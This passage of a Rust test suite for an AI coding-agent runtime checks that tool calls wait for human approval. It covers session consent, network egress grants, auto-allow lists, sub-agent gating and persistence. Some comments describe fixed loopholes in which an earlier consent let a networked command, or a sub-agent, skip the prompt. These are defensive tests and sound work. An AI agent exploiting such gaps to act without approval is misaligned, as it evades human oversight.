            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let mut registry = ToolRegistry::default();
    registry.register(FakeShellTool);
    let runtime = AgentRuntime::new(client, registry)
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Yolo));

    let mut rx = runtime.submit_user("push it").await;
    let events = drain(&mut rx).await;
    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "yolo must not park"
    );
    assert!(
        events.iter().any(|event| matches!(
            event,
            RuntimeEvent::ToolCallFinished { result, .. }
                if result.content.contains("net=true")
        )),
        "the sandbox policy of the executed call must carry the grant"
    );
}

/// "Approve for session" on a network command remembers the command identity:
/// the next identical declaration runs without prompting again, grant intact —
/// this is the "converse once, then git push stops asking" UX.
#[tokio::test]
async fn session_approval_remembers_network_command_identity() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_1",
                    "shell",
                    r#"{"command":"git push origin main","network":true}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_2",
                    "shell",
                    r#"{"command":"git push origin main --tags","network":true}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let mut registry = ToolRegistry::default();
    registry.register(FakeShellTool);
    let runtime = AgentRuntime::new(client, registry);

    let mut rx = runtime.submit_user("push twice").await;
    let first = drain(&mut rx).await;
    let Some(RuntimeEvent::ApprovalRequired { request, .. }) = first.last() else {
        panic!("first declaration must prompt");
    };
    assert!(request.network);

    let mut rx = runtime
        .submit_approval(ApprovalDecision::ApprovedForSession)
        .await;
    let second = drain(&mut rx).await;
    assert!(
        second
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "the remembered identity must suppress the second prompt"
    );
    // Both runs executed with the grant (flags vary, identity `git push` matches).
    let granted = second
        .iter()
        .filter(|event| {
            matches!(
                event,
                RuntimeEvent::ToolCallFinished { result, .. } if result.content.contains("net=true")
            )
        })
        .count();
    assert_eq!(granted, 2, "both pushes must run with network: {second:?}");
    assert!(matches!(
        second.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));
}

/// The converse of the test above: a consent given on an *offline* command
/// must not cover its `network: true` variant. The consent key carries the
/// declaration, so the networked call parks again — before, a remembered
/// `cargo clippy --version` handed egress to `cargo clippy --help` with
/// `network: true` and no prompt in every mode, the Auto egress floor sitting
/// below standing consent. The same identity without the declaration stays
/// covered.
#[tokio::test]
async fn session_approval_of_an_offline_command_does_not_cover_its_network_variant() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_1",
                    "shell",
                    r#"{"command":"cargo clippy --version"}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_2",
                    "shell",
                    r#"{"command":"cargo clippy --help","network":true}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_3", "shell", r#"{"command":"cargo clippy -q"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let mut registry = ToolRegistry::default();
    registry.register(FakeShellTool);
    let runtime = AgentRuntime::new(client, registry);

    let mut rx = runtime.submit_user("test three times").await;
    let first = drain(&mut rx).await;
    let Some(RuntimeEvent::ApprovalRequired { request, .. }) = first.last() else {
        panic!("the offline call must prompt: {first:?}");
    };
    assert!(!request.network);

    let mut rx = runtime
        .submit_approval(ApprovalDecision::ApprovedForSession)
        .await;
    let second = drain(&mut rx).await;
    let Some(RuntimeEvent::ApprovalRequired { request, .. }) = second.last() else {
        panic!(
            "the network variant must park again despite the offline consent: {:?}",
            second
                .iter()
                .map(RuntimeEvent::wire_kind)
                .collect::<Vec<_>>()
        );
    };
    assert!(
        request.network,
        "the second prompt is about the egress declaration"
    );

    // Approving the networked call once does not widen the offline consent —
    // but the offline consent still covers the offline repeat.
    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let third = drain(&mut rx).await;
    assert!(
        third
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "the offline repeat rides the offline consent: {:?}",
        third
            .iter()
            .map(RuntimeEvent::wire_kind)
            .collect::<Vec<_>>()
    );
    assert!(matches!(
        third.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));
}

#[tokio::test]
async fn config_auto_allow_exact_name_runs_gated_tool_without_prompt() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let config = AgentConfig {
        approval_auto_allow: vec![MockEchoTool::NAME.to_string()],
        ..AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_system_prompt(
        client,
        ToolRegistry::with_mock_tools(),
        "system",
        config,
        false,
    );

    let mut rx = runtime.submit_user("echo").await;
    let events = drain(&mut rx).await;

    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "auto_allow name must pre-approve the gated call"
    );
    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::ApprovalResolved {
            decision: ApprovalDecision::Approved,
            ..
        }
    )));
    assert_eq!(finished_ids(&events), vec!["call_1"]);
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));
}

/// The same `auto_allow` that pre-approves in a parent must NOT short-circuit
/// inside a sub-agent: a child's gated calls belong to
/// `subagent_approval_decision`, not to the human's session-level consent.
/// Otherwise a parent `auto_allow = ["shell"]` would silently hand a child
/// egress and arbitrary shell past its dispatch. Here the same config that made
/// the test above run without a prompt instead PARKS the call in a sub-agent
/// runtime (`is_subagent = true`).
#[tokio::test]
async fn config_auto_allow_does_not_apply_inside_a_subagent() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let config = AgentConfig {
        approval_auto_allow: vec![MockEchoTool::NAME.to_string()],
        ..AgentConfig::builtin()
    };
    // Last arg: is_subagent = true.
    let runtime = AgentRuntime::with_system_prompt(
        client,
        ToolRegistry::with_mock_tools(),
        "system",
        config,
        true,
    );

    let mut rx = runtime.submit_user("echo").await;
    let events = drain(&mut rx).await;

    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "auto_allow must not pre-approve a gated call inside a sub-agent; it must park"
    );
    assert!(
        !events.iter().any(|event| matches!(
            event,
            RuntimeEvent::ApprovalResolved {
                decision: ApprovalDecision::Approved,
                ..
            }
        )),
        "no channel may auto-approve a child's gated call"
    );
}

/// The complement: an entry that is merely a PREFIX of the tool's name grants
/// nothing. Standing consent is an exact-name match — `"mock_"` (or `"s"`)
/// must not stretch over whatever tools happen to share the spelling, so the
/// call parks for a human instead of running.
#[tokio::test]
async fn config_auto_allow_prefix_of_a_name_does_not_pre_approve() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let config = AgentConfig {
        approval_auto_allow: vec!["mock_".to_string()],
        ..AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_system_prompt(
        client,
        ToolRegistry::with_mock_tools(),
        "system",
        config,
        false,
    );

    let mut rx = runtime.submit_user("echo").await;
    let events = drain(&mut rx).await;

    assert!(
        matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "a prefix of a tool name must not pre-approve it: {events:?}"
    );
}

#[tokio::test]
async fn late_approval_after_cancel_is_silent() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"a"}"#),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("run").await;
    drain(&mut rx).await;

    // Cancel wins the race for the parked batch; the user's keypress lands
    // afterwards and must not surface a red error.
    let mut rx = runtime.cancel_turn().await;
    drain(&mut rx).await;
    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let events = drain(&mut rx).await;
    assert!(events.is_empty(), "late approval after cancel is benign");
}

#[tokio::test]
async fn write_file_appends_lsp_diagnostics_to_session() {
    use std::sync::Arc;

    use async_trait::async_trait;

    use crate::lsp::{Diagnostic, DiagnosticRange, Language, LspManager, LspTransport, Severity};
    use crate::workspace_tools::workspace_tool_registry;

    struct FakeTransport {
        items: Vec<Diagnostic>,
    }

    #[async_trait]
    impl LspTransport for FakeTransport {
        async fn diagnostics_for(
            &self,
            _path: &std::path::Path,
            _text: &str,
            _wait: std::time::Duration,
        ) -> anyhow::Result<Vec<Diagnostic>> {
            Ok(self.items.clone())
        }

        async fn shutdown(&self) {}
    }

    let dir = tempfile::tempdir().unwrap();
    let manager = LspManager::new(dir.path().to_path_buf());
    manager
        .install_test_transport(
            Language::Rust,
            Arc::new(FakeTransport {
                items: vec![Diagnostic {
                    file: dir.path().join("broken.rs"),
                    range: DiagnosticRange {
                        start_line: 1,
                        start_column: 1,
                        end_line: 1,
                        end_column: 2,
                    },
                    severity: Severity::Error,
                    message: "syntax error".to_string(),
                    source: None,
                    code: None,
                }],
            }),
        )
        .await;

    let args = r#"{"path":"broken.rs","content":"fn main() {"}"#;
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", "write_file", args),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "fixed".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, workspace_tool_registry(dir.path()).unwrap())
        .with_lsp_manager(dir.path().to_path_buf(), manager);

    let mut rx = runtime.submit_user("write broken rust").await;
    drain(&mut rx).await;

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let events = drain(&mut rx).await;

    let tool_result = events.iter().find_map(|event| match event {
        RuntimeEvent::ToolCallFinished { result, .. } => Some(result),
        _ => None,
    });
    let tool_result = tool_result.expect("tool result after approval");
    assert!(tool_result.content.contains("<diagnostics file="));
    assert!(tool_result.content.contains("syntax error"));
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::DiagnosticsUpdated { .. }))
    );

    let messages = runtime.session_messages().await;
    let tool_message = messages
        .iter()
        .find(|message| matches!(message.role, crate::message::Role::Tool))
        .expect("tool message");
    assert!(tool_message.content.contains("<diagnostics file="));
}

#[tokio::test]
async fn persistence_saves_messages_and_turns() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "hello".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    let session_id = runtime.session_id().await.expect("session id");
    let mut rx = runtime.submit_user("hi").await;
    drain(&mut rx).await;
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    assert_eq!(record.message_count(), 3);
    assert_eq!(record.turns.len(), 1);
}

#[tokio::test]
async fn persistence_saves_reasoning_content() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ReasoningDelta {
            text: "thinking".to_string(),
        },
        AgentEvent::TextDelta {
            text: "hello".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    let session_id = runtime.session_id().await.expect("session id");
    let mut rx = runtime.submit_user("hi").await;
    drain(&mut rx).await;
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    let (content, reasoning) = record
        .entries
        .iter()
        .find_map(|entry| match &entry.kind {
            crate::session_entry::EntryKind::Assistant {
                content, reasoning, ..
            } => Some((content.clone(), reasoning.clone())),
            _ => None,
        })
        .expect("assistant entry");
    assert_eq!(content, "hello");
    assert_eq!(reasoning.as_deref(), Some("thinking"));
}

#[tokio::test]
async fn session_updated_reports_authoritative_metadata() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "hello".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();
    let session_id = runtime.session_id().await.expect("session id");

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::SessionUpdated {
            session_id: Some(id),
            current_turn_id: Some(_),
            message_count,
            turn_count,
            ..
        } if id == &session_id && *message_count >= 2 && *turn_count == 0
    )));
}

#[tokio::test]
async fn stream_error_finalizes_open_turn() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![vec![AgentEvent::Error {
        message: "boom".to_string(),
    }]]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    let session_id = runtime.session_id().await.expect("session id");
    let mut rx = runtime.submit_user("hi").await;
    drain(&mut rx).await;
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    assert_eq!(record.turns.len(), 1);
}

#[tokio::test]
async fn persistence_saves_tool_exchange_results() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "thanks".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::with_mock_tools(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    let session_id = runtime.session_id().await.expect("session id");
    let mut rx = runtime.submit_user("please echo").await;
    drain(&mut rx).await;
    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    drain(&mut rx).await;
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    assert_eq!(record.turns.len(), 1);
    // Tool outputs persist through the entries' exchanges (single copy).
    let exchange = record
        .entries
        .iter()
        .find_map(|entry| match &entry.kind {
            crate::session_entry::EntryKind::Assistant { exchanges, .. } => exchanges.first(),
            _ => None,
        })
        .expect("assistant entry with an exchange");
    assert_eq!(exchange.call.function.name, MockEchoTool::NAME);
    assert_eq!(
        exchange.result.as_ref().expect("recorded result").content,
        "mock_echo: hi"
    );
}

#[tokio::test]
async fn resumed_runtime_continues_conversation() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::TextDelta {
                text: "hello".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "world".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    let session_id = runtime.session_id().await.expect("session id");
    let mut rx = runtime.submit_user("first").await;
    drain(&mut rx).await;
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    assert_eq!(record.message_count(), 3);

    let resumed = AgentRuntime::from_session_record(
        ScriptedClient::new(vec![vec![
            AgentEvent::TextDelta {
                text: "world".to_string(),
            },
            AgentEvent::Done { usage: None },
        ]]),
        ToolRegistry::default(),
        record,
        store,
        AgentConfig::builtin(),
    );
    let mut rx = resumed.submit_user("second").await;
    drain(&mut rx).await;
    let messages = resumed.session_messages().await;
    assert_eq!(messages.len(), 5);
    assert_eq!(messages[3].content, "second");
    assert_eq!(messages[4].content, "world");
}

/// Lifetime session cost must survive resume: it's persisted into the record
/// and restored, so a resumed session's total continues instead of resetting
/// to zero (the bug was `from_session_record` starting from `Default`).
#[tokio::test]
async fn session_cost_persists_across_resume() {
    use crate::model::Usage;

    let workspace = tempfile::tempdir().unwrap();
    let runtime = AgentRuntime::with_new_session(
        ScriptedClient::new(vec![]),
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();
    let session_id = runtime.session_id().await.expect("session id");

    let usage = Usage {
        prompt_tokens: Some(1_000),
        completion_tokens: Some(500),
        total_tokens: Some(1_500),
        reasoning_tokens: None,
        prompt_cache_hit_tokens: Some(400),
        prompt_cache_miss_tokens: Some(600),
    };
    let model = crate::config::AgentConfig::builtin().model;
    runtime.accumulate_request_usage(&model, &usage).await;
    let live_cost = runtime.state.lock().await.session_cost;
    runtime.persist().await;
    runtime.shutdown().await;

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    assert!(
        (record.session_cost.cny - live_cost.cny).abs() < 1e-9
            && (record.session_cost.usd - live_cost.usd).abs() < 1e-9,
        "persisted record must carry the lifetime cost"
    );
    assert_eq!(record.session_cache_hit_tokens, 400);
    assert_eq!(record.session_cache_miss_tokens, 600);

    let resumed = AgentRuntime::from_session_record(
        ScriptedClient::new(vec![]),
        ToolRegistry::default(),
        record,
        store,
        crate::config::AgentConfig::builtin(),
    );
    let restored = resumed.state.lock().await;
    assert!(
        (restored.session_cost.cny - live_cost.cny).abs() < 1e-9,
        "resume must restore the lifetime cost, not reset to zero"
    );
    assert_eq!(restored.session_cache_hit_tokens, 400);
    assert_eq!(restored.session_cache_miss_tokens, 600);
}

/// Returns a retriable API error on the first `stream_chat`, then succeeds.
#[derive(Clone)]
struct FallbackTestClient {
    inner: Arc<FallbackTestClientInner>,
}

struct FallbackTestClientInner {
    models: Mutex<Vec<String>>,
    attempts: Mutex<u32>,
}

impl FallbackTestClient {
    fn new() -> Self {
        Self {
            inner: Arc::new(FallbackTestClientInner {
                models: Mutex::new(Vec::new()),
                attempts: Mutex::new(0),
            }),
        }
    }

    fn models_used(&self) -> Vec<String> {
        self.inner.models.lock().unwrap().clone()
    }
}

#[async_trait::async_trait]
impl LlmClient for FallbackTestClient {
    fn provider_name(&self) -> &'static str {
        "fallback-test"
    }

    fn model(&self) -> &str {
        "fallback-test"
    }

    async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
        self.inner
            .models
            .lock()
            .unwrap()
            .push(request.model.clone());
        let attempt = {
            let mut attempts = self.inner.attempts.lock().unwrap();
            *attempts += 1;
            *attempts
        };
        if attempt == 1 {
            return Err(AgentError::Api {
                status: reqwest::StatusCode::SERVICE_UNAVAILABLE,
                message: "model overloaded".to_string(),
            });
        }

        let stream = try_stream! {
            yield AgentEvent::TextDelta { text: "recovered".to_string() };
            yield AgentEvent::Done { usage: None };
        };
        Ok(Box::pin(stream))
    }
}

#[tokio::test]
async fn auto_pro_retries_with_flash_after_retriable_api_error() {
    use crate::model_registry::{AUTO_MODEL, DEEPSEEK_FLASH, DEEPSEEK_V4_PRO};

    let client = FallbackTestClient::new();
    // Pin zh so the localized fallback-reason assertion is deterministic.
    let config = AgentConfig {
        model: AUTO_MODEL.to_string(),
        language: "zh".to_string(),
        ..AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_system_prompt(
        client.clone(),
        ToolRegistry::default(),
        "system",
        config,
        false,
    );

    let mut rx = runtime.submit_user("debug this crash").await;
    let events = drain(&mut rx).await;

    assert_eq!(
        client.models_used(),
        vec![DEEPSEEK_V4_PRO.to_string(), DEEPSEEK_FLASH.to_string()]
    );
    let telemetry = events.iter().find_map(|event| match event {
        RuntimeEvent::TurnFinished { telemetry, .. } => telemetry.as_ref(),
        _ => None,
    });
    let telemetry = telemetry.expect("turn finished with telemetry");
    assert!(telemetry.used_model_fallback);
    assert_eq!(telemetry.effective_model, DEEPSEEK_FLASH);
    assert!(telemetry.route_label.contains("fallback→flash"));
    assert!(telemetry.route_reason.contains("debug"));
    assert!(
        telemetry
            .fallback_reason
            .as_deref()
            .is_some_and(|reason| reason.contains("降级"))
    );
    assert_eq!(
        runtime.session_messages().await.last().unwrap().content,
        "recovered"
    );
}

#[tokio::test]
async fn unauthorized_api_error_does_not_fallback() {
    use crate::model_registry::AUTO_MODEL;

    #[derive(Clone)]
    struct AuthFailClient {
        calls: Arc<Mutex<u32>>,
    }

    #[async_trait::async_trait]
    impl LlmClient for AuthFailClient {
        fn provider_name(&self) -> &'static str {
            "auth-fail"
        }

        fn model(&self) -> &str {
            "auth-fail"
        }

        async fn stream_chat(&self, _request: ChatRequest) -> AgentResult<AgentEventStream> {
            *self.calls.lock().unwrap() += 1;
            Err(AgentError::Api {
                status: reqwest::StatusCode::UNAUTHORIZED,
                message: "invalid key".to_string(),
            })
        }
    }

    let client = AuthFailClient {
        calls: Arc::new(Mutex::new(0)),
    };
    // Pin the language so the localized error assertion is deterministic
    // regardless of the test machine's LANG.
    let config = AgentConfig {
        model: AUTO_MODEL.to_string(),
        language: "zh".to_string(),
        ..AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_system_prompt(
        client.clone(),
        ToolRegistry::default(),
        "system",
        config,
        false,
    );

    let mut rx = runtime.submit_user("debug this").await;
    let events = drain(&mut rx).await;

    assert_eq!(*client.calls.lock().unwrap(), 1);
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::Error { message, .. }) if message.contains("鉴权失败")
    ));
}

#[tokio::test]
async fn multi_tool_turn_executes_all_auto_calls_in_order_and_persists() {
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(
                    0,
                    "call_1",
                    AutoEchoTool::NAME,
                    r#"{"message":"one"}"#,
                ),
            },
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(
                    1,
                    "call_2",
                    AutoEchoTool::NAME,
                    r#"{"message":"two"}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::with_new_session(
        client,
        registry_with_auto_and_mock(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();
    let session_id = runtime.session_id().await.expect("session id");

    let mut rx = runtime.submit_user("run both").await;
    let events = drain(&mut rx).await;

    assert_eq!(started_ids(&events), vec!["call_1", "call_2"]);
    assert_eq!(finished_ids(&events), vec!["call_1", "call_2"]);
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));

    // Persistence announcements are batched: no SessionUpdated may appear
    // between the two ToolCallFinished events of one batch.
    let finished_positions = events
        .iter()
        .enumerate()
        .filter_map(|(index, event)| {
            matches!(event, RuntimeEvent::ToolCallFinished { .. }).then_some(index)
        })
        .collect::<Vec<_>>();
    assert!(
        events[finished_positions[0]..finished_positions[1]]
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::SessionUpdated { .. })),
        "per-call SessionUpdated noise inside a batch"
    );

    let messages = runtime.session_messages().await;
    // system, user, assistant(2 tool_calls), tool(call_1), tool(call_2), assistant("done")
    assert_eq!(messages.len(), 6);
    assert_eq!(messages[2].tool_calls.len(), 2);
    assert_eq!(messages[2].tool_calls[0].id, "call_1");
    assert_eq!(messages[2].tool_calls[1].id, "call_2");
    assert_eq!(messages[3].tool_call_id.as_deref(), Some("call_1"));
    assert_eq!(messages[3].content, "read_file: one");
    assert_eq!(messages[4].tool_call_id.as_deref(), Some("call_2"));
    assert_eq!(messages[4].content, "read_file: two");
    assert_eq!(messages[5].content, "done");

    runtime.shutdown().await;
    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = store.load(&session_id).unwrap();
    assert_eq!(record.message_count(), 6);
    assert_eq!(record.turns.len(), 1);
}

#[tokio::test]
async fn multi_tool_turn_mixes_auto_and_approval_calls() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(
                    0,
                    "call_1",
                    AutoEchoTool::NAME,
                    r#"{"message":"auto"}"#,
                ),
            },
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(
                    1,
                    "call_2",
                    MockEchoTool::NAME,
                    r#"{"message":"gated"}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, registry_with_auto_and_mock());

    let mut rx = runtime.submit_user("run both").await;
    let first = drain(&mut rx).await;

    // The auto call completes before the gated call asks for approval.
    assert_eq!(finished_ids(&first), vec!["call_1"]);
    assert!(matches!(
        first.last(),
        Some(RuntimeEvent::ApprovalRequired { tool_call_id: Some(id), .. })
            if id.as_str() == "call_2"
    ));

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let second = drain(&mut rx).await;
    assert_eq!(finished_ids(&second), vec!["call_2"]);
    assert!(matches!(
        second.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));

    let messages = runtime.session_messages().await;
    // user, assistant(2 tool_calls), tool(call_1), tool(call_2), assistant("done")
    assert_eq!(messages.len(), 5);
    assert_eq!(messages[1].tool_calls.len(), 2);
    assert_eq!(messages[2].tool_call_id.as_deref(), Some("call_1"));
    assert_eq!(messages[3].tool_call_id.as_deref(), Some("call_2"));
    assert_eq!(messages[3].content, "mock_echo: gated");
}

#[tokio::test]
async fn multi_tool_turn_serializes_two_approvals() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(
                    0,
                    "call_1",
                    MockEchoTool::NAME,
                    r#"{"message":"first"}"#,
                ),
            },
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(
                    1,
                    "call_2",
                    MockEchoTool::NAME,
                    r#"{"message":"second"}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, registry_with_auto_and_mock());

    let mut rx = runtime.submit_user("run both").await;
    let first = drain(&mut rx).await;
    assert!(finished_ids(&first).is_empty());
    assert!(matches!(
        first.last(),
        Some(RuntimeEvent::ApprovalRequired { tool_call_id: Some(id), .. })
            if id.as_str() == "call_1"
    ));

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let second = drain(&mut rx).await;
    assert_eq!(finished_ids(&second), vec!["call_1"]);
    assert!(matches!(
        second.last(),
        Some(RuntimeEvent::ApprovalRequired { tool_call_id: Some(id), .. })
            if id.as_str() == "call_2"
    ));

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let third = drain(&mut rx).await;
    assert_eq!(finished_ids(&third), vec!["call_2"]);
    assert!(matches!(
        third.last(),
        Some(RuntimeEvent::TurnFinished { .. })
    ));

    let messages = runtime.session_messages().await;
    assert_eq!(messages.len(), 5);
    assert_eq!(messages[2].content, "mock_echo: first");
    assert_eq!(messages[3].content, "mock_echo: second");
}

#[tokio::test]
async fn multi_tool_turn_denying_one_call_keeps_batch_running() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(
                    0,
                    "call_1",
                    MockEchoTool::NAME,
                    r#"{"message":"first"}"#,
                ),
            },
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(
                    1,
                    "call_2",
                    MockEchoTool::NAME,
                    r#"{"message":"second"}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, registry_with_auto_and_mock());

    let mut rx = runtime.submit_user("run both").await;
    drain(&mut rx).await;

    let mut rx = runtime.submit_approval(ApprovalDecision::Denied).await;
    let second = drain(&mut rx).await;
    let denied = second
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::ToolCallFinished {
                tool_call_id,
                result,
                ..
            } if tool_call_id.as_str() == "call_1" => Some(result.status),
            _ => None,
        })
        .expect("denied call_1 still records a result");
